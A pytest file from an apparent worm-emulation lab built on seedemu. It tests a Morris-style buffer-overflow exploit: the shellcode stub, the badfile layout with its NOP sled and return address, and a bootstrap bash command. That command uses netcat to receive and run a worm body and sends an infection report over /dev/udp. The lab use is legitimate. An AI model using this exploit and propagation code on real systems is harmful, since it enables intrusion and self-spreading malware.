"""The morris-bof pair, tested on this machine without Docker."""

import hashlib
import io
import shutil
import socket
import subprocess
import tarfile
import time
from pathlib import Path

import pytest

from software.Vulnerable_Server import MorrisBufferOverflow, VulnerableServer
from software.Vulnerable_Server.vulnerabilities.base import Vulnerability
from software.Vulnerable_Server.vulnerabilities.morris_bof import yom_morris_bof
from software.Vulnerable_Server.vulnerabilities.morris_bof.yom_morris_bof import entry
from software.common.testing import FakeWorm

# sha256 of the first 51 bytes of the shellcode in Dr. Du's worm.py. If this
# fails, the stub was edited: it has to stay exactly his.
DR_DU_STUB_SHA256 = "f1becb2c638480a0d09da75ea0ead86bf00691cd9c3c4872d76d3ce5de6c6e80"
DR_DU_CONSTANTS = (0xFFFFD5E8, 0xFFFFD578)        # ebp, buf, as written in his worm.py


class Node:
    """Stands in for a seedemu node: remembers what an installer does to it."""

    def __init__(self):
        self.files, self.commands, self.attributes, self.software = [], [], {}, []

    def importFile(self, hostpath, containerpath):
        self.files.append((containerpath, Path(hostpath)))

    def setFile(self, path, content):
        self.files.append((path, content))

    def addSoftware(self, name):
        self.software.append(name)

    def appendStartCommand(self, cmd, fork=False):
        self.commands.append((cmd, fork))


def test_pair_comes_from_one_box():
    bof = MorrisBufferOverflow()
    assert isinstance(bof, Vulnerability)
    assert bof.exploit().TARGETS == bof.name == "morris-bof"
    assert bof.exploit().port == bof.port == 9090


def test_shellcode_stub_is_dr_dus_byte_for_byte():
    assert hashlib.sha256(entry._STUB).hexdigest() == DR_DU_STUB_SHA256
    assert entry._STRINGS == b"AAAABBBBCCCCDDDD/bin/bash*-c*"


@pytest.mark.parametrize("ip", ["10.158.0.71", "255.255.255.255"])
def test_shellcode_has_our_command_inside_his_stub(ip):
    code = entry.MorrisBofEntry(ebp=1, buf=1).shellcode(ip, 9998)
    assert len(code) == 51 + len(entry._STRINGS) + entry.COMMAND_ROOM + 1 == 260
    command = code[80:259].decode("ascii")
    assert len(command) == entry.COMMAND_ROOM
    assert command.startswith("export FROM={};".format(ip))
    assert "mkdir /tmp/yomw||" in command            # never overwrite an infected machine
    assert code[259:] == b"*"                        # where the stub writes its terminator


def test_shellcode_refuses_a_command_that_does_not_fit(monkeypatch):
    monkeypatch.setattr(entry, "COMMAND_ROOM", 20)
    with pytest.raises(ValueError):
        entry.MorrisBofEntry(ebp=1, buf=1).shellcode("1.1.1.1", 9998)


@pytest.mark.parametrize("ip", ["10.158.0.74", "255.255.255.255"])
def test_the_command_is_valid_bash(ip):
    """A live test once shipped `{echo ...}`, which bash cannot parse. Ask bash itself."""
    checked = subprocess.run(["bash", "-n", "-c", entry.bootstrap(ip, 9999, 9998)],
                             capture_output=True, text=True)
    assert checked.returncode == 0, checked.stderr


def test_the_command_tells_the_sender_about_an_infected_machine():
    command = entry.bootstrap("10.158.0.74", 9999, 9998)
    assert command.startswith("export FROM=10.158.0.74;")
    assert "mkdir /tmp/yomw||{ echo A>/dev/udp/$FROM/9998;exit;};" in command
    assert len(entry.bootstrap("255.255.255.255", 65535, 65535)) <= entry.COMMAND_ROOM


def free_port(kind=socket.SOCK_STREAM):
    with socket.socket(socket.AF_INET, kind) as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


def stand_in_body(path, marker):
    """A body whose worm does one thing: record that it was started, and by whom."""
    source = "import os\nopen({!r}, 'w').write('started by ' + os.environ.get('FROM', '?'))\n".format(str(marker))
    with tarfile.open(path, "w:gz") as archive:
        for name, text in (("yom_worm/__init__.py", ""), ("yom_worm/__main__.py", source)):
            info = tarfile.TarInfo(name)
            info.size = len(text)
            archive.addfile(info, io.BytesIO(text.encode()))


def push(path, port):
    """What the worm does after the exploit: wait for the listener, send everything.

    Like the worm, it then waits for the receiver to close first. Closing
    earlier would reset the connection while the receiver still has unread
    data, and the body would arrive cut off.
    """
    deadline = time.monotonic() + 10
    while time.monotonic() < deadline:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=1) as sock:
                sock.sendall(path.read_bytes())
                sock.shutdown(socket.SHUT_WR)
                sock.settimeout(5)
                try:
                    while sock.recv(4096):
                        pass
                except OSError:
                    pass
                return
        except OSError:
            time.sleep(0.1)
    raise AssertionError("nobody listened for the body on port {}".format(port))


def run_like_a_victim(command):
    return subprocess.Popen(["bash", "-c", command], stdin=subprocess.DEVNULL,
                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT)


def test_the_command_really_works(tmp_path):
    """Run the shellcode's command for real, the way a victim would.

    Reading it is not enough. Two bash traps hid in this line, and both only
    show up when it runs: a brace group written without its space, and a port
    number that bash read as a file descriptor.
    """
    if shutil.which("nc") is None:
        pytest.skip("this test needs netcat")
    home, body = tmp_path / "w", tmp_path / "body.tgz"     # not w.tgz: the command writes that one
    body_port, answer_port = free_port(), free_port(socket.SOCK_DGRAM)
    marker = home / "ran.txt"
    stand_in_body(body, marker)
    command = entry.bootstrap("127.0.0.1", body_port, answer_port, home=str(home))

    # The first time on this machine: the body lands and its worm starts.
    victim = run_like_a_victim(command)
    push(body, body_port)
    output = victim.communicate(timeout=20)[0].decode()
    assert victim.returncode == 0, output
    assert "Listening on" in output                         # nc's own words
    assert marker.read_text() == "started by 127.0.0.1"
    assert (home / "yom_worm" / "__main__.py").is_file()

    # The second time: nothing is unpacked again, and the sender is told so.
    answer = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    answer.bind(("127.0.0.1", answer_port))
    answer.settimeout(5)
    victim = run_like_a_victim(command)
    push(body, body_port)
    assert victim.wait(timeout=20) == 0
    assert answer.recvfrom(16)[0].strip() == b"A"              # "already infected"
    assert (home / "ran.txt").read_text() == "started by 127.0.0.1"


def test_a_missing_nc_does_not_claim_the_machine(tmp_path):
    """Without nc there is no body, so the machine must stay unclaimed."""
    empty = tmp_path / "no-nc-here"
    empty.mkdir()
    home = tmp_path / "w"
    command = entry.bootstrap("127.0.0.1", free_port(), free_port(socket.SOCK_DGRAM), home=str(home))
    victim = subprocess.run([shutil.which("bash"), "-c", command], stdin=subprocess.DEVNULL,
                            capture_output=True, timeout=20, env={"PATH": str(empty)})
    assert victim.returncode != 0 and b"not found" in victim.stderr
    assert not home.exists()


def test_badfile_matches_his_layout():
    ebp, buf = DR_DU_CONSTANTS
    badfile = entry.MorrisBofEntry(ebp=ebp, buf=buf).badfile("10.0.0.1", 9998)
    assert len(badfile) == 500
    offset = ebp - buf + 4                          # 116: where the return address sits
    assert int.from_bytes(badfile[offset:offset + 4], "little") == ebp + 40
    assert badfile[offset + 4:500 - 260] == b"\x90" * (240 - 120)   # it lands in the NOP sled
    assert badfile.endswith(b"*")                   # the shellcode is at the end


def test_break_in_sends_exploit_then_body_and_reads_the_answer():
    worm = FakeWorm()
    part = entry.MorrisBofEntry(ebp=DR_DU_CONSTANTS[0], buf=DR_DU_CONSTANTS[1])
    part.prepare(worm)
    worm.udp.sendto(b"ARRIVED", ("127.0.0.1", worm.announce_port))
    assert part.break_in("10.0.0.9", b"BODY") == "arrived"
    assert [(ip, port) for ip, port, _ in worm.sent] == [("10.0.0.9", 9090), ("10.0.0.9", 9999)]
    assert worm.sent[0][2].startswith(b"\x90" * 116)      # the badfile: NOPs up to the return address
    assert worm.sent[1][2] == b"BODY"


def test_break_in_reports_a_victim_that_never_listens():
    worm = FakeWorm()
    worm.deliver = lambda ip, port, data: False
    part = entry.MorrisBofEntry(ebp=1, buf=1)
    part.prepare(worm)
    assert part.break_in("10.0.0.9", b"BODY") is None


def test_installer_puts_the_hole_on_the_node():
    node = Node()
    MorrisBufferOverflow().install(node)
    assert [path for path, _ in node.files] == ["/bof/server", "/bof/stack"]
    assert node.commands == [
        ("chmod +x /bof/server /bof/stack", False),
        ("cd /bof && ./server", True),
    ]


def test_launcher_gets_an_executable_copy_of_stack():
    """A file imported onto a node arrives without its executable bit."""
    node = Node()
    entry.MorrisBofEntry.stage(node)
    assert node.files == [(entry.PROBE_BINARY, entry.ASSETS / "stack")]
    assert node.commands == [("chmod +x " + entry.PROBE_BINARY, False)]


def test_assets_are_real_files_next_to_the_sources():
    assets = Path(yom_morris_bof.__file__).parent.parent / "assets"
    assert (assets / "server").stat().st_size == 17768
    assert (assets / "stack").stat().st_size == 709188
    assert (assets / "src" / "stack.c").is_file()


def test_vulnerable_server_needs_a_choice():
    with pytest.raises(ValueError):
        VulnerableServer()
